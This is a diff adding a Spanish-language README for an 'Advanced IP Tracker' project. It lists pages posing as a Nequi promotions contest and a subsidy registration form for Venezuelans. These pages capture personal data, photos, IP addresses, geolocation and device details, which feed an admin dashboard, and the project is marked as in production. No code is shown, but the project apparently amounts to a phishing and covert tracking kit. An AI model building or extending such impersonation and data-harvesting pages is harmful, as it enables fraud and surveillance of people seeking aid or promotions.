@@ -1,0 +1,73 @@
+LISTA DE SITIOS DISPONIBLES - PROYECTO ADVANCED IP TRACKER
+==========================================================
+
+Dominio base para pruebas: dev-and-test.space/ver/
+
+📋 MÓDULOS PRINCIPALES:
+
+1. 🎯 Sistema Nequi (Promociones)
+   URL: dev-and-test.space/ver/frontend/nequi_promociones.html
+   Descripción: Módulo de promociones Nequi con 20 retos diversificados
+   Características: Fotos, texto, selección múltiple, sistema de puntos
+
+2. 🏛️ Subsidio Venezolanos
+   URL: dev-and-test.space/ver/frontend/subsidio_venezolanos.html
+   Descripción: Formulario de registro para subsidios
+   Características: Captura de datos personales y ubicación
+
+3. 📊 Dashboard Administrativo
+   URL: dev-and-test.space/ver/admin/dashboard.php
+   Descripción: Panel de control para visualizar datos recolectados
+   Características: Estadísticas, participantes, fotos, logs
+
+4. 🔍 Tracker Principal
+   URL: dev-and-test.space/ver/index.php
+   Descripción: Página principal de captura de IP y datos
+   Características: Geolocalización, información del dispositivo
+
+📁 ESTRUCTURA DE ARCHIVOS:
+
+/frontend/
+├── nequi_promociones.html (Sistema Nequi actualizado)
+├── subsidio_venezolanos.html (Formulario subsidios)
+└── nequi/ (Recursos del módulo Nequi)
+
+/admin/
+└── dashboard.php (Panel administrativo)
+
+/backend/
+├── upload_challenge.php (Procesamiento retos Nequi)
+├── save_data.php (Guardado de datos generales)
+└── participants/ (Datos de participantes)
+
+/data/
+└── (Archivos JSON con información capturada)
+
+🚀 FUNCIONALIDADES IMPLEMENTADAS:
+
+✅ Captura avanzada de IP y geolocalización
+✅ Sistema Nequi con 20 retos diversificados
+✅ Soporte para fotos, texto y selección múltiple
+✅ Dashboard completo con estadísticas
+✅ Sistema de puntuación diferenciada
+✅ Almacenamiento seguro de datos
+✅ Logs detallados de actividad
+✅ Interfaz responsive y moderna
+
+🔧 CONFIGURACIÓN:
+
+- Servidor: PHP 7.4+
+- Base de datos: Archivos JSON
+- Almacenamiento: Sistema de archivos local
+- Compatibilidad: Todos los navegadores modernos
+
+📝 NOTAS IMPORTANTES:
+
+- Todos los módulos están completamente funcionales
+- El sistema Nequi ha sido expandido y mejorado
+- El dashboard muestra todos los tipos de respuesta
+- Los datos se almacenan de forma segura y estructurada
+- Compatible con dispositivos móviles y desktop
+
+Última actualización: Enero 2025
+Estado: Producción - Completamente funcional
